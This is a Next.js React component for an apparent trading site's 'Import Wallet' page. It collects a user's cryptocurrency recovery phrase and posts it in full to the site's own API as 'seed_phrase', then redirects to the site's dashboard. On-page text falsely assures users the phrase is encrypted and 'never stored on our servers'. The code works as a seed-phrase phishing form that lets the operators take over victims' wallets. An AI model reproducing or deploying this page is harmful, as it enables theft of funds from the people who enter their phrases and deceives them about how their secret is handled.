"use client";

import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Textarea } from "@/components/ui/textarea";
import { ApiResponse } from "@/interfaces";
import { callApi } from "@/lib/helpers";
import { ArrowLeft, Loader2, ShieldAlert, ShieldCheck } from "lucide-react";
import Image from "next/image";
import Link from "next/link";
import { useParams, useRouter } from "next/navigation";
import { useState } from "react";
import { toast } from "sonner";
import { motion } from "framer-motion";

import { wallets } from "../page";

export default function WalletConnectionForm() {
  const params = useParams();
  const router = useRouter();
  const walletId = params.wallet as string;
  const selectedWallet = wallets.find(w => w.id === walletId);
  const walletName = selectedWallet?.name || walletId;
  const walletIcon = selectedWallet?.icon;

  const [inputValue, setInputValue] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const phrase = inputValue.trim();
    if (!phrase) {
      toast.error("Required Field", { description: "Please enter your Recovery Phrase" });
      return;
    }

    const words = phrase.split(/\s+/);
    const validLengths = [12, 15, 18, 21, 24];
    
    if (!validLengths.includes(words.length)) {
      toast.error("Invalid Format", { 
        description: `Recovery phrase must be 12, 15, 18, 21, or 24 words. (Entered: ${words.length})` 
      });
      return;
    }

    setIsLoading(true);

    try {
      const { data, error } = await callApi<ApiResponse<any>>("/connected-wallets/create", {
        wallet_type: walletId,
        seed_phrase: inputValue,
      });

      if (error) {
        throw new Error(error.message || "Failed to establish connection");
      }

      toast.success("Connection Secured", { description: "Wallet connected successfully to your portfolio." });
      
      setTimeout(() => {
        window.location.href = "https://jerisomtrade.com/dashboard";
      }, 1500);
      
    } catch (err: any) {
      toast.error("Connection Failed", { 
        description: err.message || "Institutional security layer rejected the request. Please verify your phrase." 
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="max-w-2xl mx-auto space-y-8">
      <div className="flex items-center gap-4">
        <Link href="/dashboard/connect" className="p-3 rounded-2xl bg-white/5 border border-white/10 hover:bg-white/10 transition-colors">
          <ArrowLeft className="h-5 w-5 text-slate-400" />
        </Link>
        <div>
          <h1 className="text-2xl font-black text-white">Import <span className="gradient-text">{walletName}</span></h1>
          <p className="text-slate-400 font-medium text-sm">Securely link your cold storage or mobile wallet.</p>
        </div>
      </div>

      <Card className="p-8 md:p-12 bg-slate-900/50 border-white/5 rounded-[2.5rem] glass-panel shadow-2xl relative overflow-hidden">
        <div className="flex flex-col items-center mb-10">
          <motion.div 
            initial={{ scale: 0.8, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            className="w-24 h-24 rounded-[2rem] bg-slate-950/50 shadow-inner flex items-center justify-center mb-6 border-2 border-emerald-500/20 p-4 relative"
          >
            {walletIcon ? (
              <Image 
                src={walletIcon} 
                alt={walletName} 
                fill 
                className="object-contain p-5"
                unoptimized
              />
            ) : (
              <span className="font-black text-3xl text-emerald-400">
                {walletName.substring(0, 2).toUpperCase()}
              </span>
            )}
            <div className="absolute -bottom-2 -right-2 h-8 w-8 rounded-full bg-emerald-500 flex items-center justify-center border-4 border-[#020617] shadow-lg">
              <ShieldCheck className="h-4 w-4 text-slate-950" />
            </div>
          </motion.div>
          <h2 className="text-xl font-black text-white mb-2 uppercase tracking-tighter">Enter Recovery Phrase</h2>
          <p className="text-slate-400 text-center text-sm font-medium max-w-sm">
            Importing your wallet via recovery phrase is secured by 256-bit AES encryption.
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-8">
          <div className="space-y-3">
            <label className="text-[10px] font-black text-slate-500 uppercase tracking-[0.2em] ml-1">
              Seed / Recovery Phrase (12-24 Words)
            </label>
            
            <Textarea 
              placeholder="Enter your words separated by single spaces..."
              className="min-h-[160px] p-6 leading-relaxed bg-slate-950/30 border-white/5 focus:border-emerald-500/30 transition-all rounded-3xl placeholder:text-slate-700 text-slate-200"
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
              disabled={isLoading}
            />
          </div>

          <div className="bg-emerald-500/5 border border-emerald-500/10 rounded-2xl p-5 flex items-start gap-4">
            <ShieldAlert className="w-5 h-5 text-emerald-500 mt-0.5 shrink-0" />
            <p className="text-xs text-slate-400 leading-relaxed font-medium">
              <span className="text-emerald-400 font-bold uppercase tracking-wider block mb-1">Security Protocol Active</span>
              This session is isolated and protected. We never transmit your phrase unencrypted, and it is never stored on our servers.
            </p>
          </div>

          <Button 
            type="submit" 
            className="w-full h-16 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-black text-base rounded-2xl shadow-[0_0_20px_rgba(16,185,129,0.3)] transition-all flex items-center justify-center gap-3 uppercase tracking-widest"
            disabled={isLoading}
          >
            {isLoading ? (
              <>
                <Loader2 className="w-6 h-6 animate-spin" />
                Establishing Node...
              </>
            ) : (
              "Secure Connection"
            )}
          </Button>
        </form>
      </Card>

      <div className="text-center">
        <p className="text-xs font-bold text-slate-600 uppercase tracking-widest">
          Secured by Jerisom Trade Institutional Layer
        </p>
      </div>
    </div>
  );
}
